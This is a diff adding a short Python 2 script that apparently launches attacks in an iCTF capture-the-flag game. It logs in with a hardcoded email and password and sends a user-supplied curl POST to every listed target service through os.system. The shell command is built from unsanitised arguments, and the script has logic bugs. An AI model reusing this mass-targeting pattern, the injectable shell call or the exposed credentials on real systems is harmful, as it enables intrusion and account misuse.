@@ -1,0 +1,35 @@
+#!/usr/bin/env python2.7
+# -*- coding: utf-8 -*-
+
+from ictf import iCTF
+import os
+import sys
+
+argc = len(sys.argv)
+if argc < 2:
+    print "no input given"
+    print "1st arg is the parameter list which will be sent to all the users"
+    exit(0)
+else:
+    service_name = []
+    port = []
+    i=iCTF("http://35.167.152.77/")
+    t = i.login("vishnu.narang@asu.edu","zaFEum6keWqt")
+    key_info = t.get_ssh_keys()
+    print key_info['ip']
+    print key_info['port']
+    ssh_string = "ssh -i ctf_key ctf@{0} -p {1}".format(key_info['ip'],key_info['port'])
+    services = t.get_service_list()
+    print "Number of Services are:" + str(len(services))
+    for service in services:
+        if service['service_name'].find("web",0,len(service['service_name'])):
+            print service['service_name']
+            service_name.append(service['service_name'])
+            port.append(service['service_id'])
+    for elem in port:
+        targets = t.get_targets(elem)
+        for target in targets['targets']:
+            hostname  = target['hostname']
+            port = target['port']
+            command = "curl -X POST {0} {1}:{2}/{3}".format(sys.argv[1],hostname,port,sys.argv[2])
+            os.system(command)
